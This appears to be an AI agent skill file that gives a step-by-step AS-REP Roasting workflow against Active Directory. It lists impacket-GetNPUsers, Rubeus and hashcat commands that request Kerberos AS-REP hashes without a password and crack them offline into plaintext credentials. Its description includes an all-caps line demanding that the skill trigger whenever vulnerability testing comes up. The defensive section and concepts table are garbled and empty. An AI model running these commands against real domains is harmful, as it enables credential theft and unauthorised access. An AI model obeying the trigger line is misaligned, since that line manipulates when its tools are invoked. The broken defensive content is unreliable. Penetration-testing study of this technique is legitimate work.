---
name: ad-asreproast-attack
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Exploit Active Directory environments using AS-REP Roasting. This skill details how to identify 
  user accounts with the 'Do not require Kerberos preauthentication' (DONT_REQ_PREAUTH) attribute 
  set, request their AS-REP tickes without a password, and crack the encrypted component offline 
  to recover plaintext credentials.
domain: cybersecurity
subdomain: penetration-testing
category: Active Directory
difficulty: intermediate
estimated_time: "1-2 hours"
mitre_attack:
  tactics: [TA0006]
  techniques: [T1558.004]
platforms: [windows, active-directory]
tags: [active-directory, kerberos, asreproast, credential-access, impacket, hashcat]
tools: [impacket-GetNPUsers, hashcat, john-the-ripper, rubeus]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# AS-REP Roasting Attack

## When to Use
- During the early phases of an Active Directory penetration test when attempting to gain initial domain user access, or seeking to escalate privileges by cracking passwords of service or admin accounts.
- This attack does *not* require a valid domain user account to perform, only network access to the Domain Controller and a list of valid usernames. (Alternatively, if you *have* a domain account, you can automatically query LDAP for vulnerable users).

## Workflow

### Phase 1: Identifying Vulnerable Accounts (With Domain Access)

If you already have a low-privileged domain account, you can query LDAP to find accounts with `DONT_REQ_PREAUTH` enabled.

```bash
# Concept: Use Impacket to query AD and request TGTs for vulnerable accounts impacket-GetNPUsers target.local/low_priv_user:Password123! -request -format hashcat -outputfile asrep_hashes.txt
```

### Phase 2: Targeted Extraction (Without Domain Access)

If you have a list of usernames but no domain credentials, you can attempt to roast them blindly against the Domain Controller.

```bash
# impacket-GetNPUsers target.local/ -usersfile users.txt -format hashcat -dc-ip 192.168.1.10 -outputfile asrep_hashes.txt
```

### Phase 3: Extracting Hashes from a Windows Host (Rubeus)

```powershell
# Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

### Phase 4: Offline Password Cracking

Extract the hashes from `asrep_hashes.txt` and run them through Hashcat.
Hashcat mode for AS-REP Roast is `18200` (Kerberos 5, etype 23, AS-REP).

```bash
# hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt --force
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Identify AD Target ] --> B{Have Valid AD Credentials? ]}
    B -->|Yes| C[LDAP Query DONT_REQ_PREAUTH ]
    B -->|No| D[Brute Force Users List ]
    C --> E[Extract & Crack Hash ]
    D --> E
```

## 🔵 Blue Team Detection & Defense
- **Audit Account Policies**: **Monitor Kerberos Event ID 4768**: **Strong Password Policies**: Key Concepts
| Concept | Description |
|---------|-------------|
| Kerberos Preauthentication | |
| AS-REP Roasting | |

## References
- Impacket Docs: [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
- SpecterOps: [Roasting AS-REPs](https://specterops.io/wp-content/uploads/sites/3/2019/11/Roasting_AS-REPs.pdf)
